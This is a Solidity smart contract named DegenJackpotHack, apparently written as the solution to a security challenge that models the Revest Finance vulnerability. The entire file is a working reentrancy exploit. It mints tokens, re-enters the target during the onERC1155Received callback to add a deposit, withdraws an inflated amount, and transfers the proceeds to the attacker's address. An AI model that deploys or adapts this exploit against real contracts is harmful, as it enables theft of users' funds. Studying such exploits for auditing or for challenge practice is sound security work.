pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../degen-jackpot/OtherInterfaces.sol";

contract DegenJackpotHack is ERC1155Receiver {
    IERC20 governance;
    IRevest revest;
    bool flag;
    address attacker;

    constructor(address revestAddress, address govAddress) {
        revest = IRevest(revestAddress);
        governance = IERC20(govAddress);
        governance.approve(revestAddress, 1 ether);
        attacker = msg.sender;
    }

    function run() external {
        mint(2);
        governance.transferFrom(msg.sender, address(this), 1 ether);
        flag = true;
        mint(100001);
    }

    function mint(uint256 amount) public {
        address[] memory recipients = new address[](1);
        uint256[] memory quantities = new uint256[](1);
        recipients[0] = address(this);
        quantities[0] = amount;
        revest.mintAddressLock(
            address(this),
            "",
            recipients,
            quantities,
            IRevest.FNFTConfig({
                asset: address(governance),
                depositAmount: 0,
                depositMul: 0
            })
        );
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external override returns (bytes4) {
        if (flag) {
            flag = false;
            revest.depositAdditionalToFNFT(1, 1 ether, 1);
            revest.withdrawFNFT(2, 100001);
            governance.transfer(attacker, governance.balanceOf(address(this)));
        }
        return
            bytes4(
                keccak256(
                    "onERC1155Received(address,address,uint256,uint256,bytes)"
                )
            );
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external override returns (bytes4) {
        return bytes4(0);
    }
}
